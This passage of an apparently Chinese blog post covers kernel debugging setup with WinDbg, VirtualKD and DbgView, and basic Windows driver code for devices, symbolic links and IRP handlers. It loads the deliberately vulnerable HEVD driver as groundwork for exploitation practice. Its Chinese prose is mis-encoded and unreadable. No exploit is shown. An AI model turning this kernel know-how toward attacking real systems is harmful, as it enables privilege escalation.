class="built_in">UNREFERENCED_PARAMETER</span>(DriverObject);</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Stopping -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT  DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(RegistryPath);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Driver Running -&gt; %wZ\n&quot;</span>, &amp;DriverObject-&gt;DriverName);</span><br><span class="line">    DriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§„å®šäº†é©±åŠ¨åŠ è½½å’Œå¸è½½çš„ä¸¤ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨åŠ è½½å’Œå¸è½½æ—¶æ‰“å°è°ƒè¯•ä¿¡æ¯</p><p><img src="https://img.joe1sn.top/uploads/big/16686bd3cbe47610118773f7164f62db.png" alt="image-20240122115841033" /></p><h2 id="ii-è°ƒè¯•ç¯å¢ƒ"><a class="markdownIt-Anchor" href="#ii-è°ƒè¯•ç¯å¢ƒ"></a> II. è°ƒè¯•ç¯å¢ƒ</h2><h3 id="ä¼ ç»Ÿä¸²å£è°ƒè¯•"><a class="markdownIt-Anchor" href="#ä¼ ç»Ÿä¸²å£è°ƒè¯•"></a> ä¼ ç»Ÿä¸²å£è°ƒè¯•</h3><p>æ·»åŠ ä¸²å£</p><img src="https://img.joe1sn.top/uploads/big/39f90005ffe45efbba9a7140e740fee8.png" alt="image-20240115212926345" style="zoom:50%;" /><p>åœ¨è™šæ‹Ÿæœºä¸­Win+Rå¬å”¤<code>msconfig</code>ï¼Œæ‰“å¼€å…è®¸ä¸²å£è°ƒè¯•</p><p><img src="https://img.joe1sn.top/uploads/big/78fe2217e7b7b00cfa98a27a83058a01.png" alt="image-20240122114955532" /></p><p>ç„¶ååœ¨ï¼ˆè®°å¾—ç”¨ç®¡ç†å‘˜æ‰“å¼€ï¼‰windbgä¸­æŒ‰ç…§å›¾ä¸­é…ç½®å³å¯ï¼Œå…¶ä»–é€‰é¡¹ä¸å˜</p><p><img src="https://img.joe1sn.top/uploads/big/5b31856f65b981c015c5f5fff5b6b725.png" alt="image-20240122115049006" /></p><p>ä¸€ç›´æ‰¾ä¸åˆ°ç®¡é“çš„è¯å¯ä»¥ç‚¹Breakå†ç­‰ä¼šå„¿å°±æœ‰äº†</p><p><img src="https://img.joe1sn.top/uploads/big/19d75ecb2fd8950a1a8aba7d70805748.png" alt="img" /></p><h3 id="virtualkdæ³•è°ƒè¯•"><a class="markdownIt-Anchor" href="#virtualkdæ³•è°ƒè¯•"></a> VirtualKDæ³•è°ƒè¯•</h3><p>é¡¹ç›®é“¾æ¥ï¼š<a href="http://virtualkd.sysprogs.org/">http://virtualkd.sysprogs.org/</a></p><p>å®‰è£…åï¼Œ<code>vmmon64.exe</code>å°±è¡Œäº†</p><p>ä½†æ˜¯ç”¨äº†å°±ä¸èƒ½ç”¨ä¸²å£è°ƒè¯•äº†</p><p><img src="https://img.joe1sn.top/uploads/big/9c72b6b964eb66c0a1d5e7f45d2a51fc.png" alt="image-20240115222104521" /></p><h3 id="æ‰“å¼€ä¿¡æ¯æ˜¾ç¤ºdbgview"><a class="markdownIt-Anchor" href="#æ‰“å¼€ä¿¡æ¯æ˜¾ç¤ºdbgview"></a> æ‰“å¼€ä¿¡æ¯æ˜¾ç¤º+DbgView</h3><p>åœ¨<code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\</code>æ³¨å†Œè¡¨ä¸­æ·»åŠ <code>Debug Print Filter</code>ï¼Œå¹¶è®¾ç½®ä¸€ä¸ª<code>Default</code>çš„<code>DWORD</code>å€¼ï¼Œä½ å¯ä»¥å°†å…¶è®¾ç½®ä¸º<code>0x8</code>æˆ–è€…å…è®¸æ›´å¤šè°ƒè¯•ä¿¡æ¯çš„<code>0xf</code></p><p><img src="https://img.joe1sn.top/uploads/big/a71e3dc209c383a939308d3d49b272b0.png" alt="image-20240122114737436" /></p><p>è™½ç„¶è¯´windbgç¡®å®èƒ½æ‰“å°å‡º<code>DbgPrint</code>ï¼Œä½†æ˜¯HEVDä½¿ç”¨çš„æ˜¯<code>DbgPrintEx</code>ï¼Œæ¥å—ä¸åˆ°ï¼Œå®‰è£…äº†DbgViewåï¼Œä»–ä¼šæŠŠè°ƒè¯•ä¿¡æ¯æ‰“å°å‡ºäº†å¹¶ä¸”windbgä¹Ÿèƒ½æ”¶åˆ°</p><p><img src="https://img.joe1sn.top/uploads/big/09c9ac07d589f67f1b6fad3b678172e4.png" alt="image-20240122113922891" /></p><h3 id="è°ƒè¯•æŒ‡ä»¤"><a class="markdownIt-Anchor" href="#è°ƒè¯•æŒ‡ä»¤"></a> è°ƒè¯•æŒ‡ä»¤</h3><p>å¦‚æœå‡ºç°äº†ä»¥ä¸‹æƒ…å†µä¸”è™šæ‹Ÿæœºå¡é¡¿ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸¤ä¸ªæŒ‡ä»¤å…³é—­è¾“å‡º</p><p><img src="https://img.joe1sn.top/uploads/big/33f118ae586f66d022e74847ca034c38.png" alt="image-20240122114457173" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; ed nt!Kd_SXS_Mask 0</span><br><span class="line">1: kd&gt; ed nt!Kd_FUSION_Mask 0</span><br></pre></td></tr></table></figure><p><strong>å…³é—­è¿™ä¸¤ä¸ªå‡½æ•°çš„è¾“å‡ºï¼Œè«åå…¶å¦™å˜å¡çš„è¯å†ç”¨ä¸€ä¸‹</strong></p><h2 id="iii-é©±åŠ¨åŠ è½½"><a class="markdownIt-Anchor" href="#iii-é©±åŠ¨åŠ è½½"></a> III. é©±åŠ¨åŠ è½½</h2><p>ä½¿ç”¨KmdManager.exeï¼Œæ¯›å­çš„é»‘ç§‘æŠ€ï¼Œä½¿ç”¨æ—¶éœ€è¦ç®¡ç†å‘˜å¯åŠ¨</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨osLoaderå•¥çš„</p><p>è¿™é‡Œç”¨KmdKitçš„KmdManageræ¼”ç¤ºï¼Œè¿è¡ŒHEVD</p><p><img src="https://img.joe1sn.top/uploads/big/54dbab58e1a08495d2692e00e28164ee.png" alt="image-20240115234008160" /></p><p><img src="https://img.joe1sn.top/uploads/big/5c22ef7ea1a4180500ef95fa027a1ecc.png" alt="image-20240117111218338" /></p><p>é‚£ä¹ˆå°±ç®—æ­å»ºæˆåŠŸ</p><h1 id="a-ç¼–ç¨‹åŸºç¡€"><a class="markdownIt-Anchor" href="#a-ç¼–ç¨‹åŸºç¡€"></a> A. ç¼–ç¨‹åŸºç¡€</h1><p>å…³äºå†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/</a></p><p>å†…æ ¸ä¸­äº¤äº’æ˜¯é€šè¿‡<code>IRP</code>è¯·æ±‚è¿›è¡Œäº¤äº’çš„</p><blockquote><p><strong>IRP</strong> ç»“æ„æ˜¯è¡¨ç¤º <em>I/O è¯·æ±‚æ•°æ®åŒ…</em>çš„éƒ¨åˆ†ä¸é€æ˜ç»“æ„ã€‚ <strong>IRP</strong> ç»“æ„çš„æœªè®°å½•æˆå‘˜æ˜¯ä¿ç•™çš„ï¼Œä»…ç”± I/O ç®¡ç†å™¨ä½¿ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”±æ–‡ä»¶ç³»ç»Ÿé©±åŠ¨ç¨‹åº (FSD) ä½¿ç”¨ã€‚</p></blockquote><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a></p><p>ä½¿ç”¨åˆ°çš„å†…å­˜å †æ ˆä¸º<code>I/O Stack</code></p><blockquote><p>I/O ç®¡ç†å™¨ä¸ºåˆ†å±‚é©±åŠ¨ç¨‹åºé“¾ä¸­çš„æ¯ä¸ªé©±åŠ¨ç¨‹åºæä¾›å…¶è®¾ç½®çš„æ¯ä¸ª IRP çš„ I/O å †æ ˆä½ç½®ã€‚ æ¯ä¸ª I/O å †æ ˆä½ç½®éƒ½åŒ…å« <strong>ä¸€ä¸ªIO_STACK_LOCATION</strong>ç»“æ„ã€‚</p></blockquote><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/i-o-stack-locations</a></p><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/images/2irpios.png" alt="è¯´æ˜ irp ä¸­ i/o å †æ ˆä½ç½®çš„å†…å®¹çš„ç¤ºæ„å›¾ã€‚" /></p><p>IRPé€šè¿‡iostackå‘é€ç»™è®¾å¤‡ï¼Œå¯¹åº”çš„æ˜¯åº”ç”¨å±‚çš„â€œæ¶ˆæ¯â€ã€‚è®¾å¤‡å¯ä»¥å­˜åœ¨ï¼ˆç¡¬ç›˜ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥ä¸å­˜åœ¨ï¼ˆQQ Protecté©±åŠ¨ç­‰ï¼‰ã€‚</p><p>æ ¹æ®ä¸Šå›¾ï¼Œåº”ç”¨å±‚é€šè¿‡å’Œè®¾å¤‡å¯¹è±¡ï¼ˆFDOï¼‰è¿›è¡Œäº¤äº’ï¼Œè®¾å¤‡ï¼ˆPDOï¼‰å†å’Œè®¾å¤‡å¯¹è±¡äº¤äº’ï¼Œå®ç°äº¤äº’ã€‚åŒæ—¶FDOå‘PDOçš„äº¤äº’ä¸æ˜¯å¿…è¦çš„ã€‚</p><blockquote><h2 id="hal-ç¡¬ä»¶æŠ½è±¡å±‚"><a class="markdownIt-Anchor" href="#hal-ç¡¬ä»¶æŠ½è±¡å±‚"></a> HAL ç¡¬ä»¶æŠ½è±¡å±‚</h2><p>HALé€šå¸¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åŠ¨æ€é“¾æ¥åº“ï¼Œwindowsè‡ªèº«æºå¸¦å¤šç§HALï¼Œä½†æ˜¯åœ¨ç³»ç»Ÿå®‰è£…çš„æ—¶å€™åªä¼šé€‰æ‹©ä¸€ç§ï¼Œåä¸º<code>hal.dll</code>ã€‚æ¶‰åŠä¸­æ–­æ§åˆ¶å™¨ã€å•å¤„ç†å™¨/å¤šå¤„ç†å™¨ç¡¬ä»¶æ–­ç‚¹ã€‚</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/1e87772ff6bc6d7cc688242870d4b527.png" alt="image-20240116133826071" /></p><h1 id="b-ä»£ç "><a class="markdownIt-Anchor" href="#b-ä»£ç "></a> B. ä»£ç </h1><p><img src="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/images/driverfunctionpointers01.png" alt="å›¾ï¼šdriver-object ç»“æ„ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚" /></p><h3 id="åˆ›å»ºè®¾å¤‡"><a class="markdownIt-Anchor" href="#åˆ›å»ºè®¾å¤‡"></a> åˆ›å»ºè®¾å¤‡</h3><p>MSDNï¼š<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree">https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/device-tree</a></p><p>ä½¿ç”¨DeviceTreeï¼Œå¯ä»¥æ‰¾åˆ°ï¼š<a href="https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip">https://web.archive.org/web/20200519214156/http://www.osronline.com/OsrDown.cfm/devicetree_v230.zip</a></p><p><img src="https://img.joe1sn.top/uploads/big/7e44caefc4f0dd8b3fb72d5422ace35f.png" alt="image-20240116141544394" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING DeviceName = &#123; <span class="number">0</span> &#125;;          <span class="comment">//è®¾å¤‡å</span></span><br><span class="line">PDEVICE_OBJECT pDevice = <span class="literal">NULL</span>;              <span class="comment">//è®¾å¤‡å¯¹è±¡</span></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, DEVICE_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0</span>, &amp;DeviceName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, TRUE, &amp;pDevice);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Device Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºç¬¦å·é“¾æ¥"><a class="markdownIt-Anchor" href="#åˆ›å»ºç¬¦å·é“¾æ¥"></a> åˆ›å»ºç¬¦å·é“¾æ¥</h3><p><img src="https://img.joe1sn.top/uploads/big/e4fce5afcd7288e9e8cb6cb95909e77f.png" alt="image-20240116141604421" /></p><p><img src="https://img.joe1sn.top/uploads/big/60c01f30c4f411d81016e83d56d4d96c.png" alt="image-20240116141556022" /></p><p>ç¬¦å·é“¾æ¥å°±æ˜¯ç±»ä¼¼ä¸<code>Z:\</code>ä¹‹å‰çš„å‰ç¼€</p><p>ä½¿ç”¨<code>WinObj</code>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ç”¨çš„å†ç¬¬ä¸€ç« ä¸­ä¸‹è½½çš„<code>KdmKie</code>ä¸­çš„<code>SymLinks</code>ï¼ˆå¤ªè€äº†ï¼Œå»ºè®®æ¢ä¸€ä¸ªï¼‰</p><p><img src="https://img.joe1sn.top/uploads/big/7767beddb14038bf253be19869b69628.png" alt="image-20240116141803859" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">UNICODE_STRING SymLink = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;SymLink, SYM_NAME);</span><br><span class="line">Status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;SymLink, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create Symbol Link Failed: %x\n&quot;</span>, Status);</span><br><span class="line">    <span class="built_in">IoDeleteDevice</span>(pDevice);</span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å…³è”åŠŸèƒ½çš„äº¤äº’"><a class="markdownIt-Anchor" href="#å…³è”åŠŸèƒ½çš„äº¤äº’"></a> å…³è”åŠŸèƒ½çš„äº¤äº’</h3><h4 id="i-åˆ›å»ºå¥æŸ„"><a class="markdownIt-Anchor" href="#i-åˆ›å»ºå¥æŸ„"></a> I. åˆ›å»ºâ€œå¥æŸ„â€</h4><p><img src="https://img.joe1sn.top/uploads/big/bdfd8cc8b7ede9711595ddbd7f5a06f5.png" alt="image-20240116142649799" /></p><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/gettingstarted/minidrivers-and-driver-pairs</a></p><p>å…·ä½“è°ƒè¯•æ–¹æ³•ä¹Ÿåœ¨ä¸Šé¢çš„æ–‡æ¡£ä¸­</p><blockquote><p>æ¯ä¸ªå†…æ ¸æ¨¡å¼é©±åŠ¨ç¨‹åºéƒ½å¿…é¡»å®ç°åä¸º <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_initialize"><strong>DriverEntry</strong></a> çš„å‡½æ•°ï¼Œè¯¥å‡½æ•°åœ¨åŠ è½½é©±åŠ¨ç¨‹åºä¹‹åä¼šç«‹å³å¾—åˆ°è°ƒç”¨ã€‚ <strong>DriverEntry</strong> å‡½æ•°ä½¿ç”¨æŒ‡å‘é©±åŠ¨ç¨‹åºå®ç°çš„ä¸€äº›å…¶ä»–å‡½æ•°çš„æŒ‡é’ˆæ¥å¡«å…… <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object"><strong>DRIVER_OBJECT</strong></a> ç»“æ„çš„æŸäº›æˆå‘˜ã€‚ ä¾‹å¦‚ï¼Œ<strong>DriverEntry</strong> å‡½æ•°ä½¿ç”¨æŒ‡å‘é©±åŠ¨ç¨‹åºçš„ <strong>Unload</strong> å‡½æ•°çš„æŒ‡é’ˆæ¥å¡«å…… <strong>DRIVER_OBJECT</strong> ç»“æ„çš„ <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload"><em>Unload</em></a> æˆå‘˜</p></blockquote><p><img src="https://img.joe1sn.top/uploads/big/021fcdc7adca77ff40fe201966cd80c5.png" alt="image-20240116143040078" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = MyCreate;</span><br></pre></td></tr></table></figure><p>æ ¹æ®ä¸Šé¢çš„æ–‡æ¡£ï¼Œåˆ›å»ºçš„å‡½æ•°å’Œä¸»å‡½æ•°<code>Entry</code>å·®ä¸å¤šï¼Œ<strong>è¿™é‡Œç”¨çš„æ˜¯è®¾å¤‡å¯¹è±¡ï¼Œä¸æ˜¯é©±åŠ¨å¯¹è±¡</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS </span></span><br><span class="line"><span class="function"><span class="title">MyCreate</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Opened\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ii-å…³é—­å¥æŸ„"><a class="markdownIt-Anchor" href="#ii-å…³é—­å¥æŸ„"></a> II. å…³é—­â€œå¥æŸ„â€</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = MyClose;</span><br><span class="line">DriverObject-&gt;MajorFunction[IRP_MJ_CLEANUP] = MyClean;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClose</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Closed\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyClean</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Clean\n&quot;</span>);</span><br><span class="line">    pIrp-&gt;IoStatus.Status = RET;</span><br><span class="line">    pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> RET;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/4ece7b08bbaf2850915e56ec056c6bb5.png" alt="image-20240116150816039" /></p><p><img src="https://img.joe1sn.top/uploads/big/f997951f4d3315156cf557ea3c2f1f61.png" alt="image-20240116150757589" /></p><p>æˆåŠŸåŠ è½½</p><h4 id="iii-åœ¨ring3è¿›è¡Œäº¤äº’"><a class="markdownIt-Anchor" href="#iii-åœ¨ring3è¿›è¡Œäº¤äº’"></a> III. åœ¨Ring3è¿›è¡Œäº¤äº’</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hDevice = <span class="literal">NULL</span>;</span><br><span class="line">    hDevice = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\My1DeviceLinker&quot;</span>, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDevice== INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Error Create File\n&quot;</span>;</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success open\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Success close\n&quot;</span>;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/1d37d1b44725a3e158122215fe25ae4b.png" alt="image-20240116161601128" /></p><h1 id="c-äºŒé˜¶æ®µ"><a class="markdownIt-Anchor" href="#c-äºŒé˜¶æ®µ"></a> C. äºŒé˜¶æ®µ</h1><p>MSDNï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-iocreatedevice</a></p><p>å…³äºåˆ›å»ºè®¾å¤‡çš„åŸå‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[in] DeviceExtensionSize</span><br></pre></td></tr></table></figure><p>æŒ‡å®šè¦ä¸º <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/device-extensions">è®¾å¤‡å¯¹è±¡çš„è®¾å¤‡æ‰©å±•</a> åˆ†é…çš„é©±åŠ¨ç¨‹åºç¡®å®šçš„å­—èŠ‚æ•°ã€‚ è®¾å¤‡æ‰©å±•çš„å†…éƒ¨ç»“æ„æ˜¯é©±åŠ¨ç¨‹åºå®šä¹‰çš„ã€‚</p></blockquote><ul><li>ç»´æŠ¤è®¾å¤‡çŠ¶æ€ä¿¡æ¯ã€‚</li><li>ä¸ºé©±åŠ¨ç¨‹åºä½¿ç”¨çš„ä»»ä½•å†…æ ¸å®šä¹‰å¯¹è±¡æˆ–å…¶ä»–ç³»ç»Ÿèµ„æºï¼ˆå¦‚æ—‹è½¬é”ï¼‰æä¾›å­˜å‚¨ã€‚</li><li>ä¿å­˜é©±åŠ¨ç¨‹åºå¿…é¡»åœ¨ç³»ç»Ÿç©ºé—´ä¸­é©»ç•™çš„ä»»ä½•æ•°æ®ï¼Œä»¥æ‰§è¡Œå…¶ I/O æ“ä½œã€‚</li></ul><p>é‚£ä¹ˆè¿™å°±æ˜¯ä¸€æ®µæè¿°è¦ä¼ è¾“çš„æ•°æ®çš„ç©ºé—´çš„å¤§å°çš„å€¼ã€‚</p><h3 id="ä»é©±åŠ¨ä¸­è¯»å–"><a class="markdownIt-Anchor" href="#ä»é©±åŠ¨ä¸­è¯»å–"></a> ä»é©±åŠ¨ä¸­è¯»å–</h3><p>é©±åŠ¨<code>MyRead</code>å‡½æ•°å’Œ<code>DriverEntry</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function"><span class="title">MyRead</span><span class="params">(PDEVICE_OBJECT pdevice, PIRP pIrp)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">UNREFERENCED_PARAMETER</span>(pdevice);</span><br><span class="line">    NTSTATUS RET = STATUS_SUCCESS;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;My Device Has Read\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    PIO_STACK_LOCATION pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">    ULONG ReadSize = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">    PCHAR Buffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">    <span class="built_in">DbgPrint</span>(<span class="string">&quot;Ring3 Want 